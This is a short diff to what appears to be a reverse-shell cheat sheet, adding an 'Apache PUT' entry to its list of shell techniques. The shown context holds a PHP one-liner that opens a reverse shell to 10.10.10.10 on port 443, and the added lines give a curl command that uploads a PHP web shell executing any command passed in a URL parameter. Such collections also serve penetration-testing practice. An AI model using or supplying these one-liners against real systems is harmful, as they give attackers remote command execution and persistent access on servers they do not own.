@@ -10,6 +10,7 @@ Basic reverse shells for any scenario
 - Bash TCP
 - Bash UDP
 - PHP
+- Apache PUT
 - Netcat
 - Java
 - Pure Groovy (Jenkins)
@@ -290,6 +291,10 @@ php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 // Replace IP & Port
 
+```
+# Apache PUT
+```
+curl -X PUT -d '<?php system($_GET["c"]);?>' http://10.10.10.10/shell.php
 ```
 
 # NetCat
